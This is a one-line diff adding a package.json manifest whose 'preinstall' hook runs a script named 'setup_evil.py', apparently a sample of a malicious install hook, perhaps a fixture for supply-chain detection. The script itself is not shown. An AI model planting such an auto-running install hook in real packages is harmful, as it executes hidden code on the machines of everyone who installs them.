@@ -1,0 +1,1 @@
+{"scripts":{"preinstall":"python setup_evil.py","test":"jest"}}
